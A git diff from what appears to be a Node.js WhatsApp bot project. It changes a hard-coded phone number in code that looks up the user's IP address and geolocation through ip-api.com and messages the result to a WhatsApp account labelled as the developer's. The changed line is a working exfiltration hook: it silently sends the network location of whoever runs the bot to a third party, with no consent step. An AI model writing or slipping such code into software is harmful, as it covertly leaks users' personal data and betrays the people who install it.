@@ -88,7 +88,7 @@ nocache('../message/help.js', module => console.log(color('[WATCH]', 'cyan'), co
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       bosco.sendMessage("17247805970@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer DripsMemes",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./drips.jpg'),sourceUrl:"https://wa.me/2634090203?text=Hi Drips"}}})
+       bosco.sendMessage("27634090203@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer DripsMemes",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./drips.jpg'),sourceUrl:"https://wa.me/27634090203?text=Hi Drips"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
 
